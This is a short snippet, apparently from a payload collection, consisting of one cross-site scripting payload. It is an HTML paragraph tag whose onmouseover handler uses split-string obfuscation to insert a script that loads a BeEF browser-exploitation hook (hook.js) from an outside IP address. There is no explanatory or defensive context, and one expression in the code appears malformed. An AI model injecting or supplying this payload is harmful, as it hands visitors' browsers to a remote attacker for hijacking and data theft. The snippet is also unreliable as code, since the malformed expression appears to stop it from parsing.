...
```javascript
<p onmouseover="javascript:(function(){if($['bro'+'wser']chrome){return 0;};if(typeof beef=='undefined'){var url='http://119.132.128.103:3000/hook.'+'j'+'s';dd=self['d'+'o'+'cument'];bf=dd['create'+'Element']('script');bf.async=true;bf.src=url;dd.body.appendChild(bf);}})();">
</p>
```
